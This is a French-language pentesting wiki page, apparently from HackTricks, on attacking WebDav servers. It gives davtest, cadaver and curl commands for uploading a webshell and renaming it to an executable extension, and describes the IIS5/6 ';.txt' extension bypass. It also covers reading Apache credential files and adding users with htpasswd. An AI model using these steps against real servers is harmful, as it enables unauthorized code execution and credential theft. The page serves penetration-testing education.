# WebDav

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav) pour cr√©er et **automatiser des workflows** facilement gr√¢ce aux **outils communautaires les plus avanc√©s** au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
{% endhint %}

Lorsqu'il s'agit d'un **serveur HTTP avec WebDav** activ√©, il est possible de **manipuler des fichiers** si vous avez les bonnes **informations d'identification**, g√©n√©ralement v√©rifi√©es par **HTTP Basic Authentication**. Prendre le contr√¥le d'un tel serveur implique souvent le **t√©l√©chargement et l'ex√©cution d'un webshell**.

L'acc√®s au serveur WebDav n√©cessite g√©n√©ralement des **informations d'identification valides**, le [**bruteforce WebDav**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) √©tant une m√©thode courante pour les acqu√©rir.

Pour contourner les restrictions sur les t√©l√©chargements de fichiers, en particulier celles emp√™chant l'ex√©cution de scripts c√¥t√© serveur, vous pourriez :

* **T√©l√©charger** des fichiers avec des **extensions ex√©cutables** directement si ce n'est pas restreint.
* **Renommer** des fichiers non ex√©cutables t√©l√©charg√©s (comme .txt) avec une extension ex√©cutable.
* **Copier** des fichiers non ex√©cutables t√©l√©charg√©s, en changeant leur extension pour une extension ex√©cutable.

## DavTest

**Davtest** essaie de **t√©l√©charger plusieurs fichiers avec diff√©rentes extensions** et **v√©rifie** si l'extension est **ex√©cut√©e** :
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
![](<../../.gitbook/assets/image (851).png>)

Cela ne signifie pas que les **extensions .txt** et **.html sont ex√©cut√©es**. Cela signifie que vous pouvez **acc√©der √† ces fichiers** via le web.

## Cadaver

Vous pouvez utiliser cet outil pour **vous connecter au serveur WebDav** et effectuer des actions (comme **t√©l√©charger**, **d√©placer** ou **supprimer**) **manuellement**.
```
cadaver <IP>
```
## Requ√™te PUT
```
curl -T 'shell.txt' 'http://$ip'
```
## Demande MOVE
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav) pour cr√©er et **automatiser des flux de travail** facilement gr√¢ce aux **outils communautaires les plus avanc√©s** au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

## Vuln√©rabilit√© WebDav IIS5/6

Cette vuln√©rabilit√© est tr√®s int√©ressante. Le **WebDav** ne **permet pas** de **t√©l√©charger** ou de **renommer** des fichiers avec l'extension **.asp**. Mais vous pouvez **contourner** cela en **ajoutant** √† la fin du nom **";.txt"** et le fichier sera **ex√©cut√©** comme s'il s'agissait d'un fichier .asp (vous pourriez √©galement **utiliser ".html" au lieu de ".txt"** mais **N'OUBLIEZ PAS le ";"**).

Ensuite, vous pouvez **t√©l√©charger** votre shell en tant que fichier ".**txt"** et **le copier/d√©placer dans un fichier ".asp;.txt"**. En acc√©dant √† ce fichier via le serveur web, il sera **ex√©cut√©** (cadaver dira que l'action de d√©placement n'a pas fonctionn√©, mais c'est le cas).

![](<../../.gitbook/assets/image (1092).png>)

## Post credentials

Si le Webdav utilisait un serveur Apache, vous devriez examiner les sites configur√©s dans Apache. Commun√©ment :\
_**/etc/apache2/sites-enabled/000-default**_

√Ä l'int√©rieur, vous pourriez trouver quelque chose comme :
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
Comme vous pouvez le voir, il y a des fichiers avec les **identifiants** valides pour le serveur **webdav** :
```
/etc/apache2/users.password
```
√Ä l'int√©rieur de ce type de fichiers, vous trouverez le **nom d'utilisateur** et un **hash** du mot de passe. Ce sont les identifiants que le serveur webdav utilise pour authentifier les utilisateurs.

Vous pouvez essayer de **craquer** ces identifiants, ou d'**ajouter** d'autres si pour une raison quelconque vous souhaitez **acc√©der** au serveur **webdav** :
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
Pour v√©rifier si les nouvelles informations d'identification fonctionnent, vous pouvez faire :
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## R√©f√©rences

* [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)
{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR au** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav) pour construire et **automatiser des workflows** facilement gr√¢ce aux **outils communautaires les plus avanc√©s** au monde.\
Obtenez l'acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}
